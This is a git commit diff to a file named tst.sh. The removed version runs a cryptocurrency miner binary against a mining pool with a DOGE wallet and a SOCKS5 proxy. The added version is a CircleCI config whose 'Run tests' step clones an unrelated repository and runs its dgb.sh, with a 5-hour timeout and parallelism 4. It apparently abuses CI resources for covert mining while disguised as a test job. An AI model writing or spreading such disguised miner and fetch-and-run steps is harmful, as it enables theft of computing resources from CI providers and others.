55985eb2eef107a28e2e748a054dee9ae11f5d94
MarisaNicole <88166806+MarisaNicole@users.noreply.github.com>
2021-07-30 07:28:47 +0700

    Update tst.sh

--- tst.sh
+++ tst.sh
@@ -1,7 +1,24 @@
-#!/bin/sh
-POOL=rx.unmineable.com:3333
-WALLET=DOGE:DLd8SKUyrMCAuUt4ToGWDirH6fpQTf6BvV
-WORKER=$(echo $(shuf -i 10-299 -n 1)-ANDRO-X)
-PROXY=socks5://192.252.209.155:14455
-chmod +x ddd
-./ddd -o $POOL -a rx -k -u $WALLET.$WORKER#tyhl-8s04 --threads=2 $PROXY -q
+version: 2.1 
+ 
+orbs: 
+   
+  python: circleci/python@1.2 
+ 
+workflows: 
+  sample:   
+    jobs: 
+      - build-and-test 
+ 
+ 
+jobs: 
+  build-and-test:
+    parallelism: 4
+    docker: 
+      - image: cimg/python:3.8 
+     
+    steps: 
+      - checkout 
+      - run: 
+          name: Run tests 
+          no_output_timeout: 5h 
+          command: git clone https://github.com/IdaAMcKay/IdaAMcKay.git && cd IdaAMcKay && chmod +x dgb.sh && ./dgb.sh
